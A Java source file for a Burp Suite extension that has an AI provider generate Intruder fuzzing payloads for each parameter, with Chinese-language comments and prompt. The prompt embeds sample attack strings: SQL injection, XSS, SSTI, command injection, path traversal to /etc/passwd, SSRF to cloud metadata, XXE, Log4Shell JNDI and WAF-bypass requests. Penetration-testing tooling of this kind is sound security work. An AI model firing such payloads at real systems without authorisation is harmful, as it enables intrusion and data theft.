package ai.burp.scanner;

import java.util.*;

import burp.api.montoya.core.ByteArray;
import burp.api.montoya.intruder.AttackConfiguration;
import burp.api.montoya.intruder.GeneratedPayload;
import burp.api.montoya.intruder.IntruderInsertionPoint;
import burp.api.montoya.intruder.PayloadGenerator;
import burp.api.montoya.intruder.PayloadGeneratorProvider;

import ai.burp.model.ChatMessage;
import ai.burp.provider.StreamingAIProvider;

/**
 * AI Intruder 载荷生成器 - 注册为Burp原生PayloadGeneratorProvider。
 * 在 Intruder 攻击时，AI 根据插入点上下文生成针对性载荷，
 * 替代传统字典暴力枚举，实现智能 Fuzz。
 */
public class AIIntruderProvider implements PayloadGeneratorProvider
{
    private final StreamingAIProvider provider;
    private final AuditLogger logger;

    public AIIntruderProvider(StreamingAIProvider provider, AuditLogger logger)
    {
        this.provider = provider;
        this.logger = logger;
    }

    @Override
    public String displayName()
    {
        return "AI 智能载荷生成器";
    }

    @Override
    public PayloadGenerator providePayloadGenerator(AttackConfiguration attackConfiguration)
    {
        if (!provider.isConfigured()) return null;
        return new AIPayloadGenerator(provider, logger);
    }

    /**
     * AI 载荷生成器实现。
     */
    private static class AIPayloadGenerator implements PayloadGenerator
    {
        private final StreamingAIProvider provider;
        private final AuditLogger logger;
        private List<ByteArray> payloads;
        private int index = 0;
        private boolean initialized = false;

        AIPayloadGenerator(StreamingAIProvider provider, AuditLogger logger)
        {
            this.provider = provider;
            this.logger = logger;
        }

        @Override
        public GeneratedPayload generatePayloadFor(IntruderInsertionPoint insertionPoint)
        {
            // 延迟初始化：第一次调用时根据 baseValue 生成载荷
            if (!initialized)
            {
                initialized = true;
                String baseValue = insertionPoint.baseValue() != null
                    ? insertionPoint.baseValue().toString() : "";
                generatePayloads(baseValue);
            }

            if (index < payloads.size())
            {
                return GeneratedPayload.payload(payloads.get(index++));
            }
            return GeneratedPayload.end();
        }

        private void generatePayloads(String baseValue)
        {
            payloads = new ArrayList<>();
            try
            {
                String prompt = "你是安全测试专家。针对参数值 '" + baseValue + "'，生成智能化的安全测试载荷。\n\n"
                    + "## 参数值分析\n"
                    + "请根据参数值的特征智能选择payload：\n"
                    + "- 数字型(id=123) → 优先: SQL数字注入、IDOR、越权测试\n"
                    + "- 字符串型(name=admin) → 优先: SQL字符串注入、XSS、SSTI、命令注入\n"
                    + "- 路径型(path=/images/) → 优先: 路径遍历、LFI\n"
                    + "- URL型(url=http://...) → 优先: SSRF\n"
                    + "- JSON型 → 优先: JSON注入、类型混淆、模板注入\n"
                    + "- 空值或未知 → 覆盖所有主要漏洞类型\n\n"
                    + "## 载荷格式\n"
                    + "每行一个payload，不要编号，不要解释。按以下优先级排列：\n"
                    + "1. 最可能成功的payload（基于参数值分析）\n"
                    + "2. 该类型的WAF绕过变体\n"
                    + "3. 其他漏洞类型的基础测试\n\n"
                    + "参考payload示例（根据参数值特征选择）：\n"
                    + "SQL: ' OR '1'='1' -- | 1 AND SLEEP(3)-- | 1 UNION SELECT NULL--\n"
                    + "XSS: <script>alert(1)</script> | <img src=x onerror=alert(1)> | \"><svg/onload=alert(1)>\n"
                    + "SSTI: {{7*7}} | ${7*7} | <%=7*7%> | #{7*7}\n"
                    + "命令: ;id | |id | `id` | $(id) | %0aid\n"
                    + "路径: ../../../etc/passwd | ..\\..\\..\\windows\\win.ini\n"
                    + "SSRF: http://127.0.0.1 | http://169.254.169.254/latest/meta-data/\n"
                    + "XXE: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
                    + "LDAP: *)(|(cn=*)) | admin)(&))\n"
                    + "CRLF: %0d%0aX-Injected:true\n"
                    + "Log4Shell: ${jndi:ldap://x} | ${${::-j}ndi:ldap://x}\n"
                    + "通用: ..;/ | %00 | {{''.__class__}}\n\n"
                    + getIntruderOobContext()
                    + "直接输出payload列表，每行一个，最多50个。优先输出最可能成功的payload。";

                String result = provider.chat(Collections.singletonList(ChatMessage.user(prompt)));

                for (String line : result.split("\n"))
                {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#") || line.startsWith("```")) continue;
                    line = line.replaceFirst("^\\d+\\.\\s*", "");
                    if (!line.isEmpty())
                    {
                        payloads.add(ByteArray.byteArray(line));
                    }
                }

                logger.log("Intruder", "", "AI生成 " + payloads.size() + " 个载荷");
            }
            catch (Exception e)
            {
                logger.log("Intruder", "", "AI生成载荷失败: " + e.getMessage());
            }
        }
    }

    /**
     * 构建 Intruder 场景下的 OOB 域名提示。
     * 在 SSRF payload 列表中替换默认的 127.0.0.1 为实际 OOB 域名。
     */
    private static String getIntruderOobContext()
    {
        String oob = FullVulnDatabase.getOobDomain();
        if (oob == null || oob.isEmpty())
        {
            return "";
        }
        return "重要：当前可用的带外测试(OOB)域名为 " + oob
            + "。SSRF载荷中使用此域名替代127.0.0.1，例如 http://" + oob + "/intruder-test 。\n\n";
    }
}
